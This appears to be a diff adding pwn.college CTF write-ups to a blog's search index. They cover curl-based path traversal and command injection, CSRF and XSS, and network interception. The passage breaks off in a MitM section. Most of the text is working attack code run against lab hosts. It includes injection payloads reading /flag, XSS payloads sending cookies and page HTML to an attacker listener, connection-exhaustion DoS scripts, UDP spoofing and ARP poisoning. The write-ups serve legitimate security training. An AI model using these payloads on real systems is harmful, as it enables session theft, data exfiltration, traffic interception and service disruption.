@@ -6535,4 +6535,304 @@ Exploration</h3>
         <tag>pwncollege</tag>
       </tags>
   </entry>
+  <entry>
+    <title>PwnCollege - curl injection</title>
+    <url>/ctf/wp/PwnCollege/PwnCollege-curl-injection/</url>
+    <content><![CDATA[<h2 id="path-traversal">path traversal</h2>
+<p><code>--path-as-is</code> prevents curl from normalizing
+<code>../</code> sequences.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># path-traversal-1</span></span><br><span class="line">curl --path-as-is <span class="string">&quot;http://challenge.localhost:80/filesystem/../../../../../../../flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># path-traversal-2</span></span><br><span class="line">curl --path-as-is <span class="string">&quot;http://challenge.localhost:80/data/fortunes/../../../../../../flag&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="command-injection">command injection</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cmdi 1 - semicolon</span></span><br><span class="line">curl -G <span class="string">&quot;http://challenge.localhost:80/serve&quot;</span> --data-urlencode <span class="string">&quot;top-path=;cat /flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cmdi 2 - ampersand</span></span><br><span class="line">curl -G <span class="string">&quot;http://challenge.localhost:80/objective&quot;</span> --data-urlencode <span class="string">&quot;filepath=&amp;cat /flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cmdi 3 - quote escape + comment</span></span><br><span class="line">curl -G <span class="string">&quot;http://challenge.localhost:80/test&quot;</span> --data-urlencode <span class="string">&quot;top-path=&#x27;; cat /flag; #&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cmdi 4 - space-separated injection</span></span><br><span class="line">curl -G <span class="string">&quot;http://challenge.localhost:80/stage&quot;</span> --data-urlencode <span class="string">&quot;tzone=a cat /flag;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cmdi 5 - blind (no direct output), redirect to file</span></span><br><span class="line">curl -G <span class="string">&quot;http://challenge.localhost:80/activity&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;file-loc=; cat /flag &gt; /tmp/flag_out&quot;</span></span><br><span class="line"><span class="built_in">cat</span> /tmp/flag_out</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmdi 6 - newline injection</span></span><br><span class="line">curl <span class="string">&quot;http://challenge.localhost:80/exercise?root=%0acat%20/flag&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="authentication-bypass">authentication bypass</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># query parameter</span></span><br><span class="line">curl <span class="string">&quot;http://challenge.localhost:80/?session_user=admin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cookie</span></span><br><span class="line">curl <span class="string">&quot;http://challenge.localhost:80/&quot;</span> --cookie <span class="string">&quot;session_user=admin&quot;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PwnCollege - CSRF</title>
+    <url>/ctf/wp/PwnCollege/PwnCollege-CSRF/</url>
+    <content><![CDATA[<h2 id="csrf-1">CSRF 1</h2>
+<p>In this level, the application has a <code>/publish</code> route that
+uses a <code>GET</code> request to change the state of the application
+(publishing drafts). Since <code>GET</code> requests should ideally be
+idempotent and not change state, this is a classic CSRF
+vulnerability.</p>
+<h3 id="analysis">Analysis</h3>
+<p>The server-side code for the <code>/publish</code> route:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flask.session:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Log in first!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Vulnerability: State change via GET request with no CSRF protection</span></span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="exploit">Exploit</h3>
+<p>We can host a simple HTML page that redirects the victim (the admin)
+to the <code>/publish</code> endpoint. When the admin visits our page,
+their browser will automatically include their session cookies when
+following the redirect to <code>challenge.localhost</code>.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://challenge.localhost:80/publish&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Host the payload: <code>python3 -m http.server 1337</code></li>
+<li>Trigger the victim to visit your server:
+<code>/challenge/victim</code></li>
+<li>The admin’s drafts are now published. Fetch the flag:
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="csrf-level-2-post-based-csrf">CSRF Level 2: POST-based CSRF</h2>
+<p>The <code>/publish</code> route now requires a <code>POST</code>
+request. While this prevents simple link-based triggers, it doesn’t stop
+CSRF if there are no CSRF tokens or origin checks.</p>
+<h3 id="exploit-1">Exploit</h3>
+<p>We use an HTML form that automatically submits itself via JavaScript
+to perform the <code>POST</code> request on behalf of the admin.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;http://challenge.localhost:80/publish&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf-form&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Host the payload on port 1337.</li>
+<li>Run <code>/challenge/victim</code>.</li>
+<li>Login and check the published posts to find the flag.</li>
+</ol>
+<h2 id="csrf-level-3-reflected-xss">CSRF Level 3: Reflected XSS</h2>
+<p>This level introduces a reflected XSS vulnerability in the
+<code>/ephemeral</code> route. The <code>msg</code> parameter is
+rendered directly into the page without sanitization.</p>
+<h3 id="analysis-1">Analysis</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ephemeral&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_ephemeral</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;You have received an ephemeral message!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        The message: <span class="subst">&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span></span></span><br><span class="line"><span class="string">        &lt;hr&gt;&lt;form&gt;Craft an ephemeral message:&lt;input type=text name=msg action=/ephemeral&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="exploit-2">Exploit</h3>
+<p>We can inject a script tag through the <code>msg</code>
+parameter.</p>
+<p><strong>Payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> xss_payload = <span class="string">&quot;&lt;script&gt;alert(&#x27;PWNED&#x27;)&lt;/s&quot;</span> + <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(xss_payload);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="csrf-level-4-cookie-stealing-via-xss">CSRF Level 4: Cookie
+Stealing via XSS</h2>
+<p>Building on the previous level, we use the XSS vulnerability to steal
+the admin’s session cookie.</p>
+<h3 id="exploit-3">Exploit</h3>
+<p>We inject a script that reads <code>document.cookie</code> and sends
+it to our attacker-controlled listener.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> xss_payload =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;&lt;script&gt;fetch(&#x27;http://hacker.localhost:1338/?stolen_cookie=&#x27; + encodeURIComponent(document.cookie));&lt;/s&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(xss_payload);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Listen for the incoming cookie: <code>nc -l -p 1338</code></li>
+<li>Host the payload and trigger the victim.</li>
+<li>Once the cookie is captured (e.g., <code>auth=admin|...</code>), use
+it to access the flag: <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --cookie <span class="string">&quot;auth=admin|...&quot;</span> <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="csrf-level-5-data-exfiltration-via-xss">CSRF Level 5: Data
+Exfiltration via XSS</h2>
+<p>In this final level, we use XSS to fetch the content of the admin’s
+home page (where the flag is displayed) and send the entire HTML back to
+our listener.</p>
+<h3 id="exploit-4">Exploit</h3>
+<p>The payload performs an internal <code>fetch('/')</code> while the
+admin is authenticated, then <code>POST</code>s the response body to the
+attacker.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> stage2_xss =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;&lt;script&gt;fetch(&#x27;/&#x27;).then(res =&gt; res.text()).then(html =&gt; fetch(&#x27;http://hacker.localhost:1338&#x27;, &#123;method: &#x27;POST&#x27;, body: html&#125;))&lt;/s&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(stage2_xss);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Listen for the POST data: <code>nc -l -p 1338</code></li>
+<li>Host the payload and trigger the victim.</li>
+<li>The flag will be contained within the HTML received by Netcat.</li>
+</ol>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PwnCollege - Intercepting Communication</title>
+    <url>/ctf/wp/PwnCollege/PwnCollege-intercepting-communication/</url>
+    <content><![CDATA[<h2 id="scan">scan</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 - basic connect</span></span><br><span class="line">nc 10.0.0.2 31337</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 - TCP half-close: need -N to send EOF after stdin closes</span></span><br><span class="line">nc -N 10.0.0.2 31337</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 - listen</span></span><br><span class="line">nc -l -p 31337</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 - ping sweep /24 + connect</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 256); <span class="keyword">do</span> ping -w 1 -c 1 10.0.0.<span class="variable">$i</span> &amp; <span class="keyword">done</span></span><br><span class="line">nc 10.0.0.110 31337</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 - nmap /16 subnet scan</span></span><br><span class="line">nmap -v -n -Pn -p 31337 --min-rate 10000 --open 10.0.0.0/16</span><br><span class="line">nc 10.0.246.42 31337</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 - session replay</span></span><br><span class="line">curl <span class="string">&quot;http://10.0.0.2/flag?user=admin&quot;</span> \</span><br><span class="line">  --cookie <span class="string">&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.abFrwg.CMU_GnBUwk4-UoCFYjokaWxhgDI&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 - IP takeover: claim 10.0.0.3 and listen</span></span><br><span class="line">ip addr add 10.0.0.3/24 dev eth0</span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> eth0 up</span><br><span class="line">nc -l -p 31337</span><br></pre></td></tr></table></figure>
+<h2 id="firewall">firewall</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 - drop incoming on port</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 31337 -j DROP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 - drop from specific source</span></span><br><span class="line">iptables -I INPUT -s 10.0.0.3 -p tcp --dport 31337 -j DROP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 - accept outgoing</span></span><br><span class="line">iptables -I OUTPUT -p tcp --dport 31337 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 - forward drop (specific src)</span></span><br><span class="line">iptables -I FORWARD -s 10.0.0.3 -d 10.0.0.2 -p tcp --dport 31337 -j DROP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 - forward drop (all)</span></span><br><span class="line">iptables -I FORWARD -p tcp --dport 31337 -j DROP</span><br></pre></td></tr></table></figure>
+<h2 id="dos">DoS</h2>
+<h3 id="connection-queue-exhaustion">connection queue exhaustion</h3>
+<p>server uses <code>listen(1)</code> (single backlog), exhaust it with
+concurrent connections:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 10.0.0.2 31337 &amp; nc 10.0.0.2 31337 &amp; nc 10.0.0.2 31337 &amp;</span><br></pre></td></tr></table></figure>
+<h3 id="fd-exhaustion">fd exhaustion</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..500&#125;; <span class="keyword">do</span> <span class="built_in">exec</span> &#123;fd&#125;&lt;&gt;/dev/tcp/10.0.0.2/31337 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<h3 id="forking-server-dos">forking server DoS</h3>
+<p>server uses <code>ForkingTCPServer</code>, client prints flag on
+timeout. flood with ghost connections that hold sockets open:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, threading, time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ghost_connection</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> socket.socket() <span class="keyword">as</span> s:</span><br><span class="line">                s.settimeout(<span class="number">0.1</span>)</span><br><span class="line">                s.connect((<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">31337</span>))</span><br><span class="line">                s.settimeout(<span class="number">5.0</span>)</span><br><span class="line">                s.recv(<span class="number">1</span>)  <span class="comment"># hold connection open</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    threading.Thread(target=ghost_connection, daemon=<span class="literal">True</span>).start()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="scapy">scapy</h2>
+<blockquote>
+<p>CTF 环境中主机通过 veth pair 连接到 Linux
+Bridge（二层交换机）。Bridge 会学习 Source MAC 并记录到 CAM 表，全零 MAC
+或非法多播地址会被内核作为 Martian MAC 直接丢弃。必须使用真实 MAC
+地址才能让包通过。</p>
+</blockquote>
+<h3 id="raw-packets">raw packets</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> send, sendp, Ether, IP, TCP</span><br><span class="line"></span><br><span class="line"><span class="comment"># L2 - ethernet frame (must use real source MAC)</span></span><br><span class="line">sendp(Ether(src=<span class="string">&quot;aa:98:41:69:f7:79&quot;</span>, dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>, <span class="built_in">type</span>=<span class="number">0xFFFF</span>), iface=<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># L3 - IP packet with custom protocol</span></span><br><span class="line">send(IP(dst=<span class="string">&quot;10.0.0.2&quot;</span>, proto=<span class="number">0xff</span>), iface=<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># L4 - TCP with specific fields</span></span><br><span class="line">send(IP(dst=<span class="string">&quot;10.0.0.2&quot;</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, ack=<span class="number">31337</span>, flags=<span class="string">&quot;APRSF&quot;</span>), iface=<span class="string">&quot;eth0&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="tcp-handshake">TCP handshake</h3>
+<p>Scapy 绕过系统传输层协议栈直接发包。当目标返回 SYN-ACK
+时，内核发现没有对应的 socket 记录，会按 RFC 规范自动发送 RST
+掐断连接。需要用 iptables 在 Netfilter 层拦截内核的 RST：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 10.0.0.1 -d 10.0.0.2 --dport 31337 -j DROP</span><br></pre></td></tr></table></figure>
+<p>three-way handshake with scapy:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> send, sr1, IP, TCP</span><br><span class="line"></span><br><span class="line">ip = IP(dst=<span class="string">&quot;10.0.0.2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYN</span></span><br><span class="line">syn_ack = sr1(ip / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, flags=<span class="string">&quot;S&quot;</span>), timeout=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ACK</span></span><br><span class="line">send(ip / TCP(</span><br><span class="line">    sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, flags=<span class="string">&quot;A&quot;</span>,</span><br><span class="line">    seq=syn_ack[TCP].ack,</span><br><span class="line">    ack=syn_ack[TCP].seq + <span class="number">1</span>,</span><br><span class="line">))</span><br></pre></td></tr></table></figure>
+<h3 id="udp">UDP</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> send, sr1, Raw, IP, UDP</span><br><span class="line"></span><br><span class="line">ans = sr1(IP(dst=<span class="string">&quot;10.0.0.2&quot;</span>) / UDP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>) / Raw(<span class="string">b&quot;Hello, World!\n&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(ans[Raw].load)</span><br></pre></td></tr></table></figure>
+<h3 id="udp-spoofing">UDP spoofing</h3>
+<p>common pattern: server(10.0.0.3:31337) responds <code>NONE</code> to
+<code>ACTION?</code>, client(10.0.0.2) polls server. spoof a
+<code>FLAG</code> response from port 31337 to make client print the
+flag.</p>
+<p><strong>spoofing 1</strong> - client on fixed port 31338, expects
+<code>b"FLAG"</code>:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> sr1, Raw, IP, UDP</span><br><span class="line">ans = sr1(IP(src=<span class="string">&quot;10.0.0.1&quot;</span>, dst=<span class="string">&quot;10.0.0.2&quot;</span>) / UDP(sport=<span class="number">31337</span>, dport=<span class="number">31338</span>) / Raw(<span class="string">b&quot;FLAG&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(ans[Raw].load)</span><br></pre></td></tr></table></figure>
+<p><strong>spoofing 2</strong> - client expects
+<code>FLAG:host:port</code>, sends flag back to that address:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> sr1, Raw, IP, UDP</span><br><span class="line">ans = sr1(IP(src=<span class="string">&quot;10.0.0.1&quot;</span>, dst=<span class="string">&quot;10.0.0.2&quot;</span>) / UDP(sport=<span class="number">31337</span>, dport=<span class="number">31338</span>) / Raw(<span class="string">b&quot;FLAG:10.0.0.1:31337&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(ans[Raw].load)</span><br></pre></td></tr></table></figure>
+<p><strong>spoofing 3</strong> - client on random port, scapy
+<code>sr1</code> can’t match the reply. brute-force all ports with raw
+socket:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, sys</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.bind((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">31337</span>))</span><br><span class="line">s.settimeout(<span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65535</span>):</span><br><span class="line">    s.sendto(<span class="string">b&quot;FLAG:10.0.0.1:31337&quot;</span>, (<span class="string">&quot;10.0.0.2&quot;</span>, port))</span><br><span class="line"></span><br><span class="line">data, addr = s.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;data.decode().strip()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>spoofing 4</strong> - client also checks
+<code>peer_host == "10.0.0.3"</code>, so our source must be 10.0.0.3.
+but the flag reply goes to <code>FLAG:host:port</code> which we control.
+use <code>nc</code> listener in background on the same session:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -u -lvnp 4444 &gt; tmp &amp;</span><br><span class="line">python brute.py</span><br><span class="line"><span class="built_in">cat</span> tmp</span><br></pre></td></tr></table></figure>
+<h3 id="arp">ARP</h3>
+<p>send crafted ARP IS_AT response:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> sendp, Ether, ARP</span><br><span class="line"></span><br><span class="line">sendp(</span><br><span class="line">    Ether(dst=<span class="string">&quot;42:42:42:42:42:42&quot;</span>) /</span><br><span class="line">    ARP(op=<span class="number">2</span>, psrc=<span class="string">&quot;10.0.0.42&quot;</span>, hwsrc=<span class="string">&quot;42:42:42:42:42:42&quot;</span>, pdst=<span class="string">&quot;10.0.0.2&quot;</span>, hwdst=<span class="string">&quot;42:42:42:42:42:42&quot;</span>),</span><br><span class="line">    iface=<span class="string">&quot;eth0&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h3 id="arp-poisoning-intercept">ARP poisoning (intercept)</h3>
+<p>client(10.0.0.2) sends flag to server(10.0.0.3:31337). poison
+client’s ARP cache to redirect traffic to us:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">iptables -t nat -A PREROUTING -d 10.0.0.3 -p tcp --dport 31337 -j REDIRECT --to-ports 31337</span><br><span class="line">nc -lvnp 31337 &gt; tmp &amp;</span><br><span class="line">python poison.py</span><br></pre></td></tr></table></figure>
+<p><strong><code>pdst</code> is critical</strong> – without it, Scapy
+defaults to <code>0.0.0.0</code> and the target kernel silently drops
+the packet.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> sendp, Ether, ARP</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>) / ARP(</span><br><span class="line">    op=<span class="number">2</span>,</span><br><span class="line">    psrc=<span class="string">&quot;10.0.0.3&quot;</span>,</span><br><span class="line">    hwsrc=<span class="string">&quot;42:8a:e0:32:96:95&quot;</span>,  <span class="comment"># attacker MAC</span></span><br><span class="line">    pdst=<span class="string">&quot;10.0.0.2&quot;</span>,            <span class="comment"># must set!</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sendp(packet, iface=<span class="string">&quot;eth0&quot;</span>, verbose=<span class="literal">False</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="mitm">MitM</h3>
+<p>client authenticates with server via shared secret, then sends
+<code>echo</code> command. server also supports <code>flag</code>
+command. intercept and rewrite <code>echo</code> -&gt;
+<code>flag</code>.</p>
+<p>challenge source (key logic):</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># client gets secret out-of-band, sends hex-encoded to server</span></span><br><span class="line"><span class="comment"># then sends &quot;echo&quot; command + data, expects echo back</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># server: command == &quot;echo&quot; -&gt; echo data back</span></span><br><span class="line"><span class="comment">#         command == &quot;flag&quot; -&gt; send flag</span></span><br></pre></td></tr></table></figure>
+<p>solution: ARP spoof both sides with <code>arp_mitm</code>, sniff TCP
+traffic, replace <code>echo</code> payload with <code>flag</code>,
+forward everything else:</p>
